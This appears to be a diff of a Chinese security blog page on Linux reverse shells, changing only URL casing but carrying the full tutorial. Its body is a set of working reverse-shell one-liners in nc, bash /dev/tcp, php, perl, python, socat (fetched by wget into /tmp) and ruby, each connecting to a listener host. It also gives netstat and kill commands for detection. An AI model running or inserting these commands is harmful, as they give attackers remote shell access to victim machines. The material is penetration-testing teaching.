@@ -408,38 +408,38 @@ Victim：192.168.2.140 kali</code></pre><h1 id="NC-反弹-shell"><a href="#NC-�
 <p>同时，nc又是一个功能丰富的网络调试和开发工具，因为它可以建立你可能用到的几乎任何类型的连接，以及一些非常有意思的内建功能。渗透测试中，linux主机一般自带nc，Windows主机需要自行上传。</p>
 <h2 id="姿势一"><a href="#姿势一" class="headerlink" title="姿势一"></a>姿势一</h2><p>如果目标主机（受害机）支持“-e”选项的话，我们就可以直接进行利用。</p>
 <p>ps：为什么我们要在受害机的shell中反弹shell，因为有时候我们所连接的shell，执行命令时没有回显。</p>
-<p><img src="/2019/08/03/linux-reverse-shell/1594459-20190803223933113-573642117.png" alt="img"></p>
+<p><img src="/2019/08/03/Linux-Reverse-Shell/1594459-20190803223933113-573642117.png" alt="img"></p>
 <p>在Attack上开监听端口</p>
 <pre><code>C:\Users\Joker&gt;nc -l -p 2222</code></pre><p>在受害机的shell中反弹shell</p>
 <pre><code>(www-data:/var/www/html) $ nc 192.168.0.106 2222 -e /bin/bash</code></pre><p>在Attack上操作</p>
 <p>暂时只是一个没有命令提示符的shell</p>
-<p><img src="/2019/08/03/linux-reverse-shell/1594459-20190803224248198-742571081.png" alt="img"></p>
+<p><img src="/2019/08/03/Linux-Reverse-Shell/1594459-20190803224248198-742571081.png" alt="img"></p>
 <p>在这里可以用python来得到一个有交互式的shell</p>
 <pre><code>python -c &quot;import pty; pty.spawn(&#39;/bin/bash&#39;)&quot;    </code></pre><p>ps：python2/3</p>
-<p><img src="/2019/08/03/linux-reverse-shell/1594459-20190803224644312-1254570699.png" alt="img"></p>
+<p><img src="/2019/08/03/Linux-Reverse-Shell/1594459-20190803224644312-1254570699.png" alt="img"></p>
 <h2 id="姿势二"><a href="#姿势二" class="headerlink" title="姿势二"></a>姿势二</h2><p>利用 nc 与 管道 |</p>
 <pre><code>mknod backpipe p; nc 192.168.88.129（监听IP） 8888（监听Port） 0&lt;backpipe | /bin/bash 1&gt;backpipe 2&gt;backpipemknod backpipe p; nc 192.168.0.106 8888 0&lt;backpipe | /bin/bash 1&gt;backpipe 2&gt;backpipe</code></pre><p>使用管道符 | 连接nc的输出与bash的输入，使用自己创建的管道 backpipe连接/bin/bash的输出与nc的输入。<br>优点：适用于nc的 -e参数被禁。<br>缺点：会在当前目录下创建一个名为backpipe的管道文件,容易被管理员发现。</p>
-<p><img src="/2019/08/03/linux-reverse-shell/1594459-20190803225119466-806042970.png" alt="img"></p>
-<p><img src="/2019/08/03/linux-reverse-shell/1594459-20190803225140476-1059069133.png" alt="img"></p>
+<p><img src="/2019/08/03/Linux-Reverse-Shell/1594459-20190803225119466-806042970.png" alt="img"></p>
+<p><img src="/2019/08/03/Linux-Reverse-Shell/1594459-20190803225140476-1059069133.png" alt="img"></p>
 <h1 id="bash-反弹-shell"><a href="#bash-反弹-shell" class="headerlink" title="bash 反弹 shell"></a>bash 反弹 shell</h1><h2 id="Attack监听"><a href="#Attack监听" class="headerlink" title="Attack监听"></a>Attack监听</h2><pre><code>nc -lvvp 7777</code></pre><h2 id="Victim反弹"><a href="#Victim反弹" class="headerlink" title="Victim反弹"></a>Victim反弹</h2><pre><code>bash -i &gt;&amp; /dev/tcp/192.168.0.106/8888 0&gt;&amp;1</code></pre><p>ps：</p>
 <p>bash -i是打开一个交互的bash。</p>
 <p>/dev/tcp/是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。同理，Linux中还存在/dev/udp/。</p>
-<p><img src="/2019/08/03/linux-reverse-shell/1594459-20190803225933802-1604055523.png" alt="img"></p>
-<p><img src="/2019/08/03/linux-reverse-shell/1594459-20190803230001657-136512534.png" alt="img"></p>
+<p><img src="/2019/08/03/Linux-Reverse-Shell/1594459-20190803225933802-1604055523.png" alt="img"></p>
+<p><img src="/2019/08/03/Linux-Reverse-Shell/1594459-20190803230001657-136512534.png" alt="img"></p>
 <h1 id="php-反弹-shell"><a href="#php-反弹-shell" class="headerlink" title="php 反弹 shell"></a>php 反弹 shell</h1><h2 id="Attack监听-1"><a href="#Attack监听-1" class="headerlink" title="Attack监听"></a>Attack监听</h2><pre><code>nc -lvvp 4444</code></pre><h2 id="Victim反弹-1"><a href="#Victim反弹-1" class="headerlink" title="Victim反弹"></a>Victim反弹</h2><pre><code>php -r &#39;$sock=fsockopen(&quot;192.168.0.106&quot;,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;
-php -r &#39;$sock=fsockopen(&quot;192.168.0.106&quot;,4444);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></pre><p><img src="/2019/08/03/linux-reverse-shell/1594459-20190803230313719-128280629.png" alt="img"></p>
-<p><img src="/2019/08/03/linux-reverse-shell/1594459-20190803230334565-2008400817.png" alt="img"></p>
+php -r &#39;$sock=fsockopen(&quot;192.168.0.106&quot;,4444);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></pre><p><img src="/2019/08/03/Linux-Reverse-Shell/1594459-20190803230313719-128280629.png" alt="img"></p>
+<p><img src="/2019/08/03/Linux-Reverse-Shell/1594459-20190803230334565-2008400817.png" alt="img"></p>
 <h1 id="perl-反弹-shell"><a href="#perl-反弹-shell" class="headerlink" title="perl 反弹 shell"></a>perl 反弹 shell</h1><h2 id="Attack监听-2"><a href="#Attack监听-2" class="headerlink" title="Attack监听"></a>Attack监听</h2><pre><code>nc -lvvp 4444</code></pre><h2 id="Victim反弹-2"><a href="#Victim反弹-2" class="headerlink" title="Victim反弹"></a>Victim反弹</h2><pre><code>perl -e &#39;use Socket;$i=&quot;192.168.0.106&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;
 
 perl -e &#39;use Socket;$i=&quot;192.168.0.106&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/bash -i&quot;);};&#39;</code></pre><h1 id="python-反弹-shell"><a href="#python-反弹-shell" class="headerlink" title="python 反弹 shell"></a>python 反弹 shell</h1><h2 id="Attack监听-3"><a href="#Attack监听-3" class="headerlink" title="Attack监听"></a>Attack监听</h2><pre><code>nc -lvvp 5555</code></pre><h2 id="Victim反弹-3"><a href="#Victim反弹-3" class="headerlink" title="Victim反弹"></a>Victim反弹</h2><pre><code>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.0.106&quot;,5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#39;
 
-python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.0.106&quot;,5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</code></pre><p><img src="/2019/08/03/linux-reverse-shell/1594459-20190803230802388-750267960.png" alt="img"></p>
+python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.0.106&quot;,5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</code></pre><p><img src="/2019/08/03/Linux-Reverse-Shell/1594459-20190803230802388-750267960.png" alt="img"></p>
 <p>ps：python2/3</p>
-<p><img src="/2019/08/03/linux-reverse-shell/1594459-20190803230927537-338885821.png" alt="img"></p>
+<p><img src="/2019/08/03/Linux-Reverse-Shell/1594459-20190803230927537-338885821.png" alt="img"></p>
 <h1 id="socat-反弹-shell"><a href="#socat-反弹-shell" class="headerlink" title="socat 反弹 shell"></a>socat 反弹 shell</h1><h2 id="Attack监听-4"><a href="#Attack监听-4" class="headerlink" title="Attack监听"></a>Attack监听</h2><pre><code>nc -lvvp 12345</code></pre><h2 id="Victim反弹-4"><a href="#Victim反弹-4" class="headerlink" title="Victim反弹"></a>Victim反弹</h2><p>下载socat到/tmp目录下</p>
 <pre><code>wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat </code></pre><p>给socat授予可以执行权限</p>
 <pre><code>chmod 755 /tmp/socat </code></pre><p>反弹shell到目标主机的12345端口</p>
-<pre><code>/tmp/socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp:192.168.0.106:12345        </code></pre><h1 id="ruby-反弹-shell"><a href="#ruby-反弹-shell" class="headerlink" title="ruby 反弹 shell"></a>ruby 反弹 shell</h1><h2 id="Attack监听-5"><a href="#Attack监听-5" class="headerlink" title="Attack监听"></a>Attack监听</h2><pre><code>nc -lvvp 5555</code></pre><h2 id="Victim反弹-5"><a href="#Victim反弹-5" class="headerlink" title="Victim反弹"></a>Victim反弹</h2><pre><code>ruby -rsocket -e&#39;f=TCPSocket.open(&quot;192.168.0.106&quot;,5555).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;</code></pre><h1 id="排查-amp-杀掉反弹-shell"><a href="#排查-amp-杀掉反弹-shell" class="headerlink" title="排查&amp;杀掉反弹 shell"></a>排查&amp;杀掉反弹 shell</h1><h2 id="Search-Command"><a href="#Search-Command" class="headerlink" title="Search Command"></a>Search Command</h2><pre><code>→ ∮ ← :~# netstat -anop | grep ESTABLISHED</code></pre><p><img src="/2019/08/03/linux-reverse-shell/1594459-20190803233143410-1258882915.png" alt="img"></p>
+<pre><code>/tmp/socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp:192.168.0.106:12345        </code></pre><h1 id="ruby-反弹-shell"><a href="#ruby-反弹-shell" class="headerlink" title="ruby 反弹 shell"></a>ruby 反弹 shell</h1><h2 id="Attack监听-5"><a href="#Attack监听-5" class="headerlink" title="Attack监听"></a>Attack监听</h2><pre><code>nc -lvvp 5555</code></pre><h2 id="Victim反弹-5"><a href="#Victim反弹-5" class="headerlink" title="Victim反弹"></a>Victim反弹</h2><pre><code>ruby -rsocket -e&#39;f=TCPSocket.open(&quot;192.168.0.106&quot;,5555).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;</code></pre><h1 id="排查-amp-杀掉反弹-shell"><a href="#排查-amp-杀掉反弹-shell" class="headerlink" title="排查&amp;杀掉反弹 shell"></a>排查&amp;杀掉反弹 shell</h1><h2 id="Search-Command"><a href="#Search-Command" class="headerlink" title="Search Command"></a>Search Command</h2><pre><code>→ ∮ ← :~# netstat -anop | grep ESTABLISHED</code></pre><p><img src="/2019/08/03/Linux-Reverse-Shell/1594459-20190803233143410-1258882915.png" alt="img"></p>
 <h2 id="Kill-Command"><a href="#Kill-Command" class="headerlink" title="Kill Command"></a>Kill Command</h2><pre><code>kill -9 4065</code></pre>
             </div>
             <hr/>
@@ -465,7 +465,7 @@ python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://Qftm.github.io/2019/08/03/linux-reverse-shell/">http://Qftm.github.io/2019/08/03/linux-reverse-shell/</a>
+                    <a href="http://Qftm.github.io/2019/08/03/Linux-Reverse-Shell/">http://Qftm.github.io/2019/08/03/Linux-Reverse-Shell/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -550,7 +550,7 @@ python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
             <div class="card">
-                <a href="/2019/09/05/electronic-forensics-1/">
+                <a href="/2019/09/05/Electronic-Forensics-1/">
                     <div class="card-image">
                         
                         
@@ -599,7 +599,7 @@ python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket
                 Next&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2019/08/03/windows-reverse-shell/">
+                <a href="/2019/08/03/Windows-Reverse-Shell/">
                     <div class="card-image">
                         
                         
